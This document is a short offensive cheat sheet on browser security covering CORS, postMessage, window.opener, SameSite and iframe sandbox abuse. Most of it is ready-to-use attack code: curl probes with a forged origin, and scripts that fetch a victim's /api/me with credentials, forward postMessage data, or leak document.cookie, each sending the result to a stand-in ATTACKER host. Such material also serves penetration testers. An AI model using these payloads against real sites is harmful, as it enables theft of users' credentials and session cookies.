# Browser Security

## CORS

```bash
curl -i http://HOST/api/me -H 'Origin: https://ATTACKER'
curl -i http://HOST/api/me -H 'Origin: null'
curl -i http://HOST/api/me -H 'Origin: https://HOST.ATTACKER'
```

Bad signs:

```http
Access-Control-Allow-Origin: https://ATTACKER
Access-Control-Allow-Credentials: true
```

Credential exfil:

```html
<script>
fetch("https://HOST/api/me", {credentials:"include"})
  .then(r=>r.text())
  .then(x=>fetch("https://ATTACKER/", {method:"POST", body:x}))
</script>
```

## postMessage

Find listeners:

```js
getEventListeners(window).message
```

Spray:

```html
<iframe id=f src="https://HOST/"></iframe>
<script>
setTimeout(()=>{
  for (const x of [
    "admin",
    {"role":"admin"},
    {"type":"login","token":"x"},
    {"type":"debug","url":"https://ATTACKER/x.js"}
  ]) f.contentWindow.postMessage(x, "*")
}, 1000)
</script>
```

Listen for leaks:

```html
<script>
onmessage = e => fetch("https://ATTACKER/", {
  method:"POST",
  body: JSON.stringify({origin:e.origin,data:e.data})
})
</script>
```

## window.opener

```html
<a target=_blank href="https://ATTACKER/">open</a>
```

Attacker page:

```html
<script>
if (opener) opener.location = "https://ATTACKER/?c=" + encodeURIComponent(document.cookie)
</script>
```

## SameSite

```html
<script>
open("https://HOST/admin")
setTimeout(()=>location="https://HOST/action?x=1", 1000)
</script>
```

Top-level GET can still carry `SameSite=Lax` cookies.

## Sandbox Checks

```html
<iframe sandbox="allow-scripts allow-forms allow-same-origin" srcdoc="<script>fetch('https://ATTACKER/?c='+document.cookie)</script>"></iframe>
```

